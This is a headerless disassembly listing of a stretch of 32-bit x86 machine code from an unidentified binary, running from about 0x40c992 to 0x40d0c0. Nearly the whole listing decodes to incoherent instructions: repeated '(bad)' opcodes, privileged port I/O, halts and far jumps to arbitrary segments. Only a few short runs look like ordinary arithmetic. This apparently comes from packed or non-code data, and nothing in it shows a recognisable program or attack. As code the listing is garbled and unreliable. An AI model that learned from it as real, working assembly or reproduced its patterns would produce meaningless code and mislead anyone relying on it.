  40c992:	rcr    BYTE PTR [ecx-0x5ae1c8b3],cl
  40c998:	sub    DWORD PTR [esi],esi
  40c99a:	mov    ebp,es
  40c99c:	push   esi
  40c99d:	or     BYTE PTR [ebx-0x76],cl
  40c9a0:	xchg   ebx,eax
  40c9a1:	inc    eax
  40c9a2:	lea    edx,[edx+0x77]
  40c9a5:	ja     0x40ca1e
  40c9a7:	mov    ch,0x73
  40c9a9:	sar    BYTE PTR [ebx+0x7c4deec8],0x1f
  40c9b0:	stc    
  40c9b1:	adc    eax,0xd46bfeda
  40c9b6:	jmp    0x7eec0060
  40c9bb:	rcr    dh,1
  40c9bd:	into   
  40c9be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9bf:	mov    ds:0xcdc84bbd,al
  40c9c4:	aas    
  40c9c5:	lods   eax,DWORD PTR ds:[esi]
  40c9c6:	pushf  
  40c9c7:	mov    bl,0x1a
  40c9c9:	sar    BYTE PTR [ebp+ecx*2-0x46dbddae],cl
  40c9d0:	xchg   esi,eax
  40c9d1:	sub    edx,0x947e3a9e
  40c9d7:	sbb    esi,DWORD PTR [esi+0x32]
  40c9da:	fsubrp st(1),st
  40c9dc:	fs fxch st(4)
  40c9df:	test   eax,0x233ef20c
  40c9e4:	pop    edi
  40c9e5:	cmp    ecx,ebp
  40c9e7:	mov    edi,0x782967ce
  40c9ec:	out    dx,eax
  40c9ed:	dec    eax
  40c9ee:	test   BYTE PTR [eax+ebp*4],al
  40c9f1:	ror    DWORD PTR [ebp-0x18],cl
  40c9f4:	mov    edx,DWORD PTR [eax]
  40c9f6:	xor    DWORD PTR [esi-0x57ae1624],ebp
  40c9fc:	clc    
  40c9fd:	sub    BYTE PTR [ecx-0x20],al
  40ca00:	loop   0x40ca71
  40ca02:	cmp    bl,BYTE PTR [ebx+0x3df6862d]
  40ca08:	jl     0x40c9cc
  40ca0a:	mov    edi,0x8d2d30d3
  40ca0f:	jmp    0x16c595b7
  40ca14:	push   0x9b072b07
  40ca19:	mov    ds:0x2646f9,eax
  40ca1e:	jns    0x40ca41
  40ca20:	or     ebp,DWORD PTR [edx-0x21cb94a9]
  40ca26:	cmp    cl,BYTE PTR [ebp-0x16]
  40ca29:	jo     0x40c9d0
  40ca2b:	pop    esp
  40ca2c:	out    dx,al
  40ca2d:	clc    
  40ca2e:	mov    ch,BYTE PTR [eax-0x21ce7883]
  40ca34:	and    DWORD PTR [edi+0x4a6dc4c5],ebx
  40ca3a:	popf   
  40ca3b:	xchg   ebx,eax
  40ca3c:	imul   edi,esp,0x50
  40ca3f:	pusha  
  40ca40:	cmp    cl,bh
  40ca42:	repz sbb dh,cl
  40ca45:	bound  eax,QWORD PTR [ecx]
  40ca47:	mov    WORD PTR [edi+0x6f],ds
  40ca4a:	fbld   TBYTE PTR [ecx+0x3aa8efb7]
  40ca50:	(bad)  ds:0xda9552ce
  40ca56:	sbb    DWORD PTR [edi],ecx
  40ca58:	popa   
  40ca59:	push   eax
  40ca5a:	js     0x40ca02
  40ca5c:	enter  0x53b1,0xd3
  40ca60:	(bad)  
  40ca61:	cmp    al,0xcd
  40ca63:	push   edi
  40ca64:	(bad)  
  40ca66:	cdq    
  40ca67:	shl    DWORD PTR [ebx+0x3a],cl
  40ca6a:	mov    bl,0x99
  40ca6c:	sub    eax,0x1540d7eb
  40ca71:	adc    bl,BYTE PTR [edx+eax*1+0x6744b644]
  40ca78:	or     DWORD PTR [ebx+esi*2+0x52adfdb8],esp
  40ca7f:	stos   BYTE PTR es:[edi],al
  40ca80:	xchg   ecx,eax
  40ca81:	popa   
  40ca82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca83:	lods   eax,DWORD PTR ds:[esi]
  40ca84:	sar    BYTE PTR [edx+0x4d],0x4a
  40ca88:	dec    eax
  40ca89:	retf   0x5fa2
  40ca8c:	sub    eax,0xa886b206
  40ca91:	inc    ecx
  40ca92:	inc    edi
  40ca93:	xor    ch,bh
  40ca95:	rcr    DWORD PTR [ecx],cl
  40ca97:	iret   
  40ca98:	sub    al,0xaa
  40ca9a:	ret    0xdb60
  40ca9d:	sub    edx,DWORD PTR [ebx-0x77e65252]
  40caa3:	rol    bl,1
  40caa5:	hlt    
  40caa6:	fsub   st(3),st
  40caa8:	lods   al,BYTE PTR ds:[esi]
  40caa9:	cmp    eax,0x419d1034
  40caae:	btr    DWORD PTR [ebp-0x78],esp
  40cab2:	pop    edi
  40cab3:	mov    al,BYTE PTR [eax-0x17]
  40cab6:	xchg   esi,eax
  40cab7:	jp     0x40cb14
  40cab9:	(bad)  
  40caba:	nop
  40cabb:	(bad)  
  40cabc:	out    0xdc,eax
  40cabe:	mov    fs,WORD PTR [ebx]
  40cac0:	jp     0x40cb0d
  40cac2:	repnz mov dl,0xc1
  40cac5:	mov    WORD PTR ds:0x14424f1b,gs
  40cacb:	fdivr  QWORD PTR ds:0xe39ad067
  40cad1:	popa   
  40cad2:	mov    al,0x36
  40cad4:	dec    edi
  40cad5:	fcmovnb st,st(6)
  40cad7:	push   ss
  40cad8:	std    
  40cad9:	outs   dx,DWORD PTR ds:[esi]
  40cada:	mov    ds:0xca7aa4cf,eax
  40cadf:	into   
  40cae0:	pop    ebp
  40cae1:	not    DWORD PTR [edi-0x3e]
  40cae4:	js     0x40ca9a
  40cae6:	pop    ebp
  40cae7:	ret    0xe4ab
  40caea:	inc    ecx
  40caeb:	ins    DWORD PTR es:[edi],dx
  40caec:	cld    
  40caed:	loopne 0x40cb64
  40caef:	loop   0x40cb02
  40caf1:	jnp    0x40cac6
  40caf3:	shl    DWORD PTR [ecx],1
  40caf5:	jbe    0x40cb18
  40caf7:	inc    eax
  40caf8:	or     eax,0x6d147ea0
  40cafd:	lahf   
  40cafe:	in     eax,0xab
  40cb00:	loop   0x40cad0
  40cb02:	and    ah,bl
  40cb04:	jno    0x40cb7d
  40cb06:	mov    ebp,0x73b33488
  40cb0b:	daa    
  40cb0c:	pop    eax
  40cb0d:	retf   
  40cb0e:	push   ebp
  40cb0f:	sub    BYTE PTR [esi-0xe5bbd04],ch
  40cb15:	call   FWORD PTR [ecx*2-0x5f96d0bd]
  40cb1c:	push   ebx
  40cb1d:	loop   0x40caa2
  40cb1f:	push   ss
  40cb20:	xchg   edx,eax
  40cb21:	xchg   edi,eax
  40cb22:	jp     0x40cb79
  40cb24:	addr16 loopne 0x40cab9
  40cb27:	inc    ebp
  40cb28:	add    al,0x90
  40cb2a:	int3   
  40cb2b:	and    BYTE PTR [esi-0x4f],0x5
  40cb2f:	dec    ebx
  40cb30:	jo     0x40cb8f
  40cb32:	push   esi
  40cb33:	or     ebp,0x6f
  40cb36:	xchg   ebx,eax
  40cb37:	cmp    eax,0xce6a0e57
  40cb3c:	jge    0x40cb9c
  40cb3e:	push   esp
  40cb3f:	scas   al,BYTE PTR es:[edi]
  40cb40:	and    dh,BYTE PTR [edx+0x2f]
  40cb43:	outs   dx,DWORD PTR ds:[esi]
  40cb44:	call   0x2eb1:0x25242cb3
  40cb4b:	rol    edi,1
  40cb4d:	push   ebp
  40cb4e:	mov    bl,0xa5
  40cb50:	aas    
  40cb51:	fild   QWORD PTR [edi-0x36]
  40cb54:	cmp    eax,0xe7890625
  40cb59:	adc    eax,0x25a13ae3
  40cb5e:	mov    ebx,0xc040fe5a
  40cb63:	sti    
  40cb64:	cld    
  40cb65:	enter  0xce42,0xa
  40cb69:	and    edx,DWORD PTR [eax+esi*4]
  40cb6c:	out    0xa1,eax
  40cb6e:	xchg   ebp,eax
  40cb6f:	inc    eax
  40cb70:	fistp  DWORD PTR [edi-0x1d]
  40cb73:	mov    dl,0x80
  40cb75:	ret    
  40cb76:	ret    0x7b5b
  40cb79:	ss pop ebp
  40cb7b:	pop    esi
  40cb7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb7d:	mov    bh,bl
  40cb7f:	add    DWORD PTR [esi-0xdeb60c],0x1053ec79
  40cb89:	rol    DWORD PTR [edi],1
  40cb8b:	fwait
  40cb8c:	nop
  40cb8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb8e:	std    
  40cb8f:	push   es
  40cb90:	jmp    0x40cb20
  40cb92:	bound  edx,QWORD PTR [ecx+esi*2-0x12f2735c]
  40cb99:	push   eax
  40cb9a:	cdq    
  40cb9b:	pop    esi
  40cb9c:	test   BYTE PTR [edx+eax*8],0xaf
  40cba0:	mov    ds:0x57456d60,al
  40cba5:	sti    
  40cba6:	lds    esi,FWORD PTR fs:[esi-0x7d]
  40cbaa:	jmp    0xa8f6:0xbefed77d
  40cbb1:	loop   0x40cbcd
  40cbb3:	cld    
  40cbb4:	mul    ah
  40cbb6:	sub    bl,BYTE PTR [edx]
  40cbb8:	xchg   ebx,eax
  40cbb9:	mov    eax,ds:0x8e3eca1
  40cbbe:	mov    WORD PTR [esi],gs
  40cbc0:	and    eax,esi
  40cbc2:	xlat   BYTE PTR ds:[ebx]
  40cbc3:	in     eax,dx
  40cbc4:	pop    eax
  40cbc5:	rol    BYTE PTR [ebx-0x59],cl
  40cbc8:	mov    eax,ds:0x3d4949a6
  40cbcd:	ss (bad) 
  40cbcf:	push   ss
  40cbd0:	push   ss
  40cbd1:	xor    DWORD PTR [ebp+0x3aa82f7b],0x59
  40cbd8:	jnp    0x40cbf2
  40cbda:	cmp    al,0x61
  40cbdc:	sub    ebp,eax
  40cbde:	add    eax,0xde277073
  40cbe3:	fsub   DWORD PTR [ebp-0x5d853052]
  40cbe9:	test   BYTE PTR [ebp-0x21],dl
  40cbec:	js     0x40cc35
  40cbee:	cli    
  40cbef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbf0:	ja     0x40cb8e
  40cbf2:	mov    al,0x3a
  40cbf4:	inc    ecx
  40cbf5:	pop    eax
  40cbf6:	or     al,0x62
  40cbf8:	in     eax,0xbb
  40cbfa:	mov    ?,WORD PTR ds:0x6bd0697c
  40cc00:	mov    eax,DWORD PTR [edx+0x34]
  40cc03:	pop    ss
  40cc04:	repz loopne 0x40cc03
  40cc07:	mov    BYTE PTR [ecx+0x5a],bl
  40cc0a:	fimul  WORD PTR [edx-0x2c87efb3]
  40cc10:	call   0x839bb8b0
  40cc15:	ins    DWORD PTR es:[edi],dx
  40cc16:	out    0xcf,eax
  40cc18:	mov    eax,0x2bacfede
  40cc1d:	add    eax,0x1281d3e6
  40cc22:	jo     0x40cc99
  40cc24:	vshufps xmm3,xmm6,XMMWORD PTR [edx+0x69],0x79
  40cc2a:	ficom  WORD PTR [ebx]
  40cc2c:	push   es
  40cc2d:	out    0x36,eax
  40cc2f:	and    BYTE PTR [ecx],al
  40cc31:	jne    0x40cc0e
  40cc33:	add    eax,0xa07e9b50
  40cc38:	inc    esi
  40cc39:	sahf   
  40cc3a:	xchg   ecx,eax
  40cc3b:	imul   esp,DWORD PTR [edx-0x6ce9c543],0x3420df58
  40cc45:	inc    esp
  40cc46:	push   0x19634ffc
  40cc4b:	rcr    BYTE PTR [edx+0x32],1
  40cc4e:	xchg   esi,eax
  40cc4f:	or     dh,BYTE PTR [esi-0x75ac2b11]
  40cc55:	out    dx,eax
  40cc56:	ret    0xb4c6
  40cc59:	push   edx
  40cc5a:	adc    DWORD PTR [ecx+0x5b],ebp
  40cc5d:	push   0xffffffc4
  40cc5f:	jge    0x40cc56
  40cc61:	push   edx
  40cc62:	inc    eax
  40cc63:	sbb    dl,BYTE PTR [ecx]
  40cc65:	adc    ecx,ebx
  40cc67:	cwde   
  40cc68:	int    0x3
  40cc6a:	sbb    dl,BYTE PTR [edi]
  40cc6c:	xchg   al,bh
  40cc6e:	iret   
  40cc6f:	jo     0x40cc19
  40cc71:	(bad)  
  40cc73:	mov    ebx,0xfe5e614f
  40cc78:	lea    edx,[edi+0x7e]
  40cc7b:	jnp    0x40cc97
  40cc7d:	mov    dh,0xf
  40cc7f:	mov    cl,BYTE PTR [edi+0x56a0aa77]
  40cc85:	add    edx,ecx
  40cc87:	add    edi,ecx
  40cc89:	imul   edx,edi
  40cc8c:	add    edx,DWORD PTR [ebp-0x14]
  40cc8f:	mov    DWORD PTR [ebp-0x14],edx
  40cc92:	mov    edx,DWORD PTR [ebp-0xc]
  40cc95:	jmp    0x40d008
  40cc9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc9b:	loopne 0x40cc38
  40cc9d:	mov    ebx,0xe364435b
  40cca2:	mov    ecx,DWORD PTR [esi]
  40cca4:	pop    eax
  40cca5:	push   es
  40cca6:	mov    dl,0x3c
  40cca8:	push   esp
  40cca9:	mov    ds:0x7c7c923b,al
  40ccae:	retf   0x7c79
  40ccb1:	jl     0x40cd2c
  40ccb3:	aaa    
  40ccb4:	mov    al,0xa5
  40ccb6:	aad    0x3
  40ccb8:	adc    al,BYTE PTR [ebp+0x5f]
  40ccbb:	daa    
  40ccbc:	addr16 push eax
  40ccbe:	(bad)  
  40ccbf:	jmp    0x6120:0x81224333
  40ccc6:	popa   
  40ccc7:	and    ebx,DWORD PTR [ebp+0x222138c9]
  40cccd:	adc    bl,BYTE PTR [ecx]
  40cccf:	mov    ebx,0xa202f411
  40ccd4:	push   cs
  40ccd5:	adc    eax,0x1933a2e8
  40ccda:	xor    esi,ebp
  40ccdc:	(bad)  
  40ccdd:	push   es
  40ccde:	jne    0x40ccfb
  40cce0:	jb     0x40cca6
  40cce2:	bound  esi,QWORD PTR [eax+eiz*2-0x38]
  40cce6:	xchg   ecx,eax
  40cce7:	sub    bl,BYTE PTR [edx]
  40cce9:	leave  
  40ccea:	or     al,0x61
  40ccec:	das    
  40cced:	inc    esp
  40ccee:	lds    edi,FWORD PTR [eax+0xc663c48]
  40ccf4:	gs pop ss
  40ccf6:	cmc    
  40ccf7:	adc    eax,DWORD PTR [edi-0x1affb4e6]
  40ccfd:	add    ecx,DWORD PTR [ecx]
  40ccff:	ja     0x40cd6b
  40cd01:	test   eax,0x9d61f14d
  40cd06:	push   edx
  40cd07:	pusha  
  40cd08:	adc    eax,0xcdec2b98
  40cd0d:	jle    0x40ccee
  40cd0f:	hlt    
  40cd10:	jns    0x40cd08
  40cd12:	sbb    eax,0xd7349a2c
  40cd17:	sbb    al,0x71
  40cd19:	push   cs
  40cd1a:	fisubr WORD PTR [ebx-0x17ea9409]
  40cd20:	rol    ebp,0x65
  40cd23:	push   edx
  40cd24:	test   al,0xef
  40cd26:	mov    dl,0x6a
  40cd28:	out    0xaa,eax
  40cd2a:	sub    bl,BYTE PTR [edi+0xd]
  40cd2d:	cs das 
  40cd2f:	dec    esi
  40cd30:	cs loope 0x40cd08
  40cd33:	adc    eax,0xc3ec7cae
  40cd38:	lods   eax,DWORD PTR ds:[esi]
  40cd39:	pushf  
  40cd3a:	cmp    eax,0xa1f81727
  40cd3f:	xor    ah,cl
  40cd41:	push   esi
  40cd42:	loopne 0x40cd84
  40cd44:	in     al,0x49
  40cd46:	shl    BYTE PTR [ebp+0x26da586e],1
  40cd4c:	and    DWORD PTR [ecx],esi
  40cd4e:	xor    BYTE PTR [esi+0x45],al
  40cd51:	and    eax,DWORD PTR [edx]
  40cd53:	mov    DWORD PTR fs:0x92fc93ea,esp
  40cd5a:	adc    ebp,edi
  40cd5c:	data16 mov ds:0xa17dc116,al
  40cd62:	ss int3 
  40cd64:	fsub   st(2),st
  40cd66:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40cd68:	dec    edi
  40cd69:	shl    DWORD PTR [edx],1
  40cd6b:	sbb    al,0x14
  40cd6d:	dec    edi
  40cd6e:	mov    bl,0xa4
  40cd70:	sbb    edx,eax
  40cd72:	scas   eax,DWORD PTR es:[edi]
  40cd73:	lahf   
  40cd74:	fbstp  TBYTE PTR [ebp+0x19e2b6b6]
  40cd7a:	inc    edi
  40cd7b:	mov    BYTE PTR [edi+0x23],dl
  40cd7e:	inc    ebp
  40cd7f:	in     eax,0xc2
  40cd81:	imul   BYTE PTR [edi+edi*4]
  40cd84:	outs   dx,BYTE PTR ds:[esi]
  40cd85:	pop    es
  40cd86:	fistp  DWORD PTR [ecx+edx*1+0x1a]
  40cd8a:	mov    ch,0xe6
  40cd8c:	stos   BYTE PTR es:[edi],al
  40cd8d:	mov    edx,0x7929769f
  40cd92:	scas   eax,DWORD PTR es:[edi]
  40cd93:	dec    edi
  40cd94:	repz xlat BYTE PTR ds:[ebx]
  40cd96:	call   0x25291f0a
  40cd9b:	loopne 0x40cd7b
  40cd9d:	cs push ebx
  40cd9f:	ins    BYTE PTR es:[edi],dx
  40cda0:	and    edi,ebx
  40cda2:	sbb    bh,bh
  40cda4:	ret    
  40cda5:	pop    ds
  40cda6:	cmp    ebx,esi
  40cda8:	and    ebp,0x48e8e8c7
  40cdae:	ret    
  40cdaf:	sub    BYTE PTR [ebx+eax*2-0x495a1d10],dh
  40cdb6:	fadd   QWORD PTR ds:0xb348da0d
  40cdbc:	xchg   edi,eax
  40cdbe:	add    eax,0xd5b06959
  40cdc3:	dec    eax
  40cdc4:	pop    esp
  40cdc5:	pop    edx
  40cdc6:	frstor [ebx-0x7ebc26a4]
  40cdcc:	enter  0xf56e,0xfc
  40cdd0:	pop    esi
  40cdd1:	lods   al,BYTE PTR ds:[esi]
  40cdd2:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40cdd4:	imul   DWORD PTR [esi]
  40cdd6:	cli    
  40cdd7:	mov    ecx,0xdaafe90a
  40cddc:	cs push esp
  40cdde:	fwait
  40cddf:	push   edi
  40cde0:	int3   
  40cde1:	jae    0x40ce4e
  40cde3:	stos   BYTE PTR es:[edi],al
  40cde4:	sbb    ebx,DWORD PTR [esi+0x30]
  40cde7:	scas   eax,DWORD PTR es:[edi]
  40cde8:	es inc ebp
  40cdea:	add    DWORD PTR [ecx+0x66],ebp
  40cded:	frstor [ebp+0x1]
  40cdf0:	and    ebx,DWORD PTR [ebx+esi*4]
  40cdf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdf4:	inc    edi
  40cdf5:	cs fwait
  40cdf7:	cdq    
  40cdf8:	and    al,0xe0
  40cdfa:	dec    esp
  40cdfb:	outs   dx,DWORD PTR ds:[esi]
  40cdfc:	das    
  40cdfd:	or     al,0x5c
  40cdff:	xor    eax,0x1874f3b
  40ce04:	sahf   
  40ce05:	jns    0x40ce71
  40ce07:	mov    cl,0xae
  40ce09:	and    ebp,DWORD PTR [ecx]
  40ce0b:	xor    DWORD PTR [edx],edx
  40ce0d:	push   ebp
  40ce0e:	push   0x3d36f2e1
  40ce13:	cmp    esi,edi
  40ce15:	fiadd  WORD PTR [ecx]
  40ce17:	mov    dl,0x10
  40ce19:	xor    ecx,ebp
  40ce1b:	mov    edi,0xea4269af
  40ce20:	and    BYTE PTR [ebx+0x4d8ba5b2],al
  40ce26:	push   ss
  40ce27:	xor    BYTE PTR [esi+0x12],ah
  40ce2a:	arpl   WORD PTR [ecx+0x19926260],sp
  40ce30:	sete   BYTE PTR [eax]
  40ce33:	mov    dl,0xf2
  40ce35:	fadd   QWORD PTR [esi-0x3f]
  40ce38:	cmp    al,BYTE PTR [edx+0x86ef51d]
  40ce3e:	out    0xde,al
  40ce40:	push   esi
  40ce41:	cmp    dh,BYTE PTR [ebx-0x21]
  40ce44:	pusha  
  40ce45:	sti    
  40ce46:	sub    ah,cl
  40ce48:	mov    ch,0x33
  40ce4a:	dec    esi
  40ce4b:	js     0x40ce8d
  40ce4d:	test   eax,0x8e71b7c6
  40ce52:	sub    dl,BYTE PTR [ebx]
  40ce54:	adc    dh,BYTE PTR [esi+0x5632ad1d]
  40ce5a:	pop    ebx
  40ce5b:	test   dh,0xcd
  40ce5e:	(bad)  
  40ce5f:	imul   DWORD PTR [esi-0x24b5b9b7]
  40ce65:	push   edi
  40ce66:	add    BYTE PTR [ebx+esi*4-0x12],bl
  40ce6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce6b:	xor    al,0xe8
  40ce6d:	rol    BYTE PTR [ecx-0x2a3b0106],1
  40ce73:	mov    DWORD PTR [ebx],ecx
  40ce75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce76:	data16 jb 0x40ce83
  40ce79:	lods   eax,DWORD PTR ds:[esi]
  40ce7a:	in     al,dx
  40ce7b:	cmp    cl,al
  40ce7d:	push   ecx
  40ce7e:	jp     0x40ce15
  40ce80:	ss pop es
  40ce82:	loopne 0x40ced9
  40ce84:	sub    BYTE PTR [ecx],bl
  40ce86:	fstp   TBYTE PTR [edi+ebx*8-0x6c]
  40ce8a:	arpl   ax,cx
  40ce8c:	fbld   TBYTE PTR [edi-0x5]
  40ce8f:	retf   0x8088
  40ce92:	fisub  DWORD PTR ds:0xd32a7004
  40ce98:	fucomip st,st(4)
  40ce9a:	mov    ds:0x7f772743,al
  40ce9f:	les    ecx,FWORD PTR [esi+0x5e]
  40cea2:	sub    al,BYTE PTR [edi]
  40cea4:	fld    QWORD PTR [esi-0x60c3d462]
  40ceaa:	fisub  DWORD PTR [edx+eax*2+0x70fc8d23]
  40ceb1:	pop    esp
  40ceb2:	adc    al,0x71
  40ceb4:	mov    ecx,0xfa9ff013
  40ceb9:	xchg   edx,eax
  40ceba:	sbb    ecx,esi
  40cebc:	jg     0x40cf01
  40cebe:	mov    ss,edi
  40cec0:	sar    DWORD PTR [esi],0xfd
  40cec3:	gs rcr esi,0xa3
  40cec7:	xchg   edx,eax
  40cec8:	jbe    0x40cec9
  40ceca:	add    BYTE PTR [edi+0x3f61032c],ah
  40ced0:	nop
  40ced1:	int3   
  40ced2:	pop    ebp
  40ced3:	icebp  
  40ced4:	js     0x40ced8
  40ced6:	adc    al,0x3
  40ced8:	ja     0x40cef1
  40ceda:	retf   0x17e8
  40cedd:	and    dh,BYTE PTR [edx-0x1]
  40cee0:	in     al,dx
  40cee1:	jbe    0x40cf4f
  40cee3:	gs in  eax,dx
  40cee5:	fwait
  40cee6:	scas   eax,DWORD PTR es:[edi]
  40cee7:	jne    0x40ce9b
  40cee9:	jecxz  0x40cedc
  40ceeb:	fbstp  TBYTE PTR [eax-0x13]
  40ceee:	fst    QWORD PTR [ecx+0x5b588232]
  40cef4:	repnz outs dx,DWORD PTR ds:[esi]
  40cef6:	in     eax,0xed
  40cef8:	and    al,0xda
  40cefa:	sub    eax,DWORD PTR [ecx+0x7709d6d8]
  40cf00:	nop
  40cf01:	mov    edx,0x5cbf866b
  40cf06:	outs   dx,BYTE PTR ds:[esi]
  40cf07:	call   0x94c1:0x697e8774
  40cf0e:	jg     0x40cf64
  40cf10:	in     al,dx
  40cf11:	test   al,0x73
  40cf13:	(bad)  
  40cf14:	(bad)  
  40cf15:	mov    al,0x7e
  40cf17:	nop
  40cf18:	maxps  xmm4,XMMWORD PTR [eax+edx*8]
  40cf1c:	adc    al,0xc1
  40cf1e:	jb     0x40ceca
  40cf20:	ret    0xf7f3
  40cf23:	out    0x7a,al
  40cf25:	ret    
  40cf26:	arpl   WORD PTR [ebx+ebx*1-0x43],sp
  40cf2a:	xchg   esi,eax
  40cf2b:	mov    al,0x2a
  40cf2d:	aaa    
  40cf2e:	nop
  40cf2f:	retf   
  40cf30:	sub    DWORD PTR [esi],edi
  40cf32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf33:	push   ds
  40cf34:	div    DWORD PTR ss:[ebx]
  40cf37:	inc    edx
  40cf38:	jmp    0x1d9f:0xcb69cc67
  40cf3f:	mov    ah,0x7e
  40cf41:	imul   ecx,DWORD PTR [eax+0x1c4eb519],0xffffff97
  40cf48:	jbe    0x40cf48
  40cf4a:	out    dx,eax
  40cf4b:	loope  0x40cf2f
  40cf4d:	push   ss
  40cf4e:	pusha  
  40cf4f:	inc    esi
  40cf50:	out    0xf,al
  40cf52:	(bad)  
  40cf54:	pop    ebx
  40cf55:	sti    
  40cf56:	scas   eax,DWORD PTR es:[edi]
  40cf57:	jne    0x40cfcd
  40cf59:	push   esp
  40cf5a:	and    BYTE PTR [ebp+0x16],0xcf
  40cf5e:	mov    ?,WORD PTR [edx+0x46]
  40cf61:	pusha  
  40cf62:	inc    edx
  40cf63:	frstor [edx-0x45]
  40cf66:	mov    dh,0xf1
  40cf68:	ja     0x40cf4c
  40cf6a:	mov    ah,0x79
  40cf6c:	mov    dl,0xa
  40cf6e:	and    DWORD PTR [ecx+ebp*2-0x38],esp
  40cf72:	pop    ss
  40cf73:	lock addr16 cdq 
  40cf76:	mov    ds:0x2d2833b4,al
  40cf7b:	adc    al,0x4e
  40cf7d:	sti    
  40cf7e:	push   ecx
  40cf7f:	ret    
  40cf80:	mov    ebx,0x84784894
  40cf85:	adc    ch,BYTE PTR [edi+ebx*4+0x362b404]
  40cf8c:	xchg   ebp,eax
  40cf8d:	sar    edx,0xfd
  40cf90:	xchg   ebp,eax
  40cf91:	cmp    DWORD PTR [ebx],ecx
  40cf93:	aaa    
  40cf94:	xor    ecx,DWORD PTR [ecx+0x4b]
  40cf97:	sbb    bh,BYTE PTR [esi+ecx*1-0x4ab5dcae]
  40cf9e:	in     al,dx
  40cf9f:	retf   
  40cfa0:	mov    ecx,DWORD PTR [ecx+0xd606bb9]
  40cfa6:	in     eax,dx
  40cfa7:	dec    esi
  40cfa8:	sbb    al,0x38
  40cfaa:	add    eax,0xee83c133
  40cfaf:	int    0x22
  40cfb1:	sar    DWORD PTR [ebp-0x33],0x6e
  40cfb5:	jb     0x40cf9e
  40cfb7:	xor    BYTE PTR [esi],bl
  40cfb9:	shr    BYTE PTR [eax],cl
  40cfbb:	fisubr DWORD PTR [edx-0x13]
  40cfbe:	pop    edi
  40cfbf:	adc    BYTE PTR [esi+0x7814d874],cl
  40cfc5:	sub    ebx,ebp
  40cfc7:	jbe    0x40d009
  40cfc9:	dec    ecx
  40cfca:	sub    BYTE PTR [ecx-0x406fcc39],ch
  40cfd0:	popa   
  40cfd1:	cmp    al,0x1c
  40cfd3:	in     al,dx
  40cfd4:	loopne 0x40cfd3
  40cfd6:	sub    ebx,DWORD PTR [edi+0x30]
  40cfd9:	or     eax,0x1c51037a
  40cfde:	and    edi,ebp
  40cfe0:	sbb    DWORD PTR [edx],0x1f54570d
  40cfe6:	aam    0x53
  40cfe8:	cdq    
  40cfe9:	mov    bh,0xbf
  40cfeb:	and    eax,0x1afef9b0
  40cff0:	cld    
  40cff1:	mov    dh,0x7d
  40cff3:	mov    ebx,0xa687a558
  40cff8:	loop   0x40cfd6
  40cffa:	xchg   ebp,eax
  40cffb:	and    eax,0xef9a5ca4
  40d000:	fld    QWORD PTR [esi+0x31a194b]
  40d006:	imul   edi,edi,0xffffff8b
  40d009:	jge    0x40cfe7
  40d00b:	xor    edx,eax
  40d00d:	add    edx,ecx
  40d00f:	imul   edx,edi
  40d012:	jmp    0x40d385
  40d017:	retf   
  40d018:	jo     0x40cff3
  40d01a:	or     ah,BYTE PTR [ecx-0x63]
  40d01d:	jmp    0x40d09c
  40d01f:	sahf   
  40d020:	xor    dl,dh
  40d022:	ins    BYTE PTR es:[edi],dx
  40d023:	std    
  40d024:	test   eax,0x9f91bced
  40d029:	jl     0x40d0a7
  40d02b:	retf   0x7c79
  40d02e:	jl     0x40d061
  40d030:	fild   WORD PTR [edi]
  40d032:	or     DWORD PTR [esi-0x68],esp
  40d035:	fisttp QWORD PTR [edx]
  40d037:	cmp    eax,DWORD PTR [ecx]
  40d039:	pop    edx
  40d03a:	sub    DWORD PTR [ecx+0x726de34b],ebx
  40d040:	lods   al,BYTE PTR ds:[esi]
  40d041:	daa    
  40d042:	mov    BYTE PTR [ebx+0x6dda7908],ah
  40d048:	shl    DWORD PTR [esi+0xab7d26c],cl
  40d04e:	ds cwde 
  40d050:	or     ch,BYTE PTR [eax-0x7]
  40d053:	inc    ecx
  40d054:	add    eax,0x43ac6d22
  40d059:	cmc    
  40d05a:	sbb    DWORD PTR ds:0x3c05d3a4,ecx
  40d060:	icebp  
  40d061:	stc    
  40d062:	out    dx,eax
  40d063:	cmp    ebx,DWORD PTR [eax+ebp*1]
  40d066:	inc    ecx
  40d067:	hlt    
  40d068:	and    ecx,ebp
  40d06a:	out    dx,eax
  40d06b:	dec    eax
  40d06c:	inc    esi
  40d06d:	jmp    0x40d0c7
  40d06f:	lods   al,BYTE PTR ds:[esi]
  40d070:	inc    ebp
  40d071:	mov    bl,0x71
  40d073:	pop    ss
  40d074:	cli    
  40d075:	out    dx,eax
  40d076:	mov    gs,esp
  40d078:	int3   
  40d079:	add    edx,DWORD PTR cs:[ecx-0x16]
  40d07d:	push   ecx
  40d07e:	sti    
  40d07f:	jno    0x40d065
  40d081:	ja     0x40d006
  40d083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d084:	shr    DWORD PTR [ecx-0x4a51f6c8],0xc6
  40d08b:	in     al,0x9a
  40d08d:	and    BYTE PTR [edx+esi*8],dh
  40d090:	xchg   ebx,eax
  40d091:	push   es
  40d092:	(bad)  
  40d093:	pop    esi
  40d094:	jns    0x40d095
  40d096:	rcr    DWORD PTR [edx],0xfe
  40d099:	adc    al,0xdd
  40d09b:	or     al,0xff
  40d09d:	adc    DWORD PTR [esi+0x39],ebp
  40d0a0:	jbe    0x40d03e
  40d0a2:	jne    0x40d033
  40d0a4:	pop    ebx
  40d0a5:	sbb    ebp,DWORD PTR [esp+ebx*2]
  40d0a8:	mov    edx,DWORD PTR [esp+edx*4+0x2bb9238d]
  40d0af:	and    dl,BYTE PTR ds:0xab85c261
  40d0b5:	arpl   di,di
  40d0b7:	dec    edi
  40d0b8:	hlt    
  40d0b9:	mov    ecx,0x1252059
  40d0be:	inc    ecx
  40d0bf:	cld    
  40d0c0:	icebp  
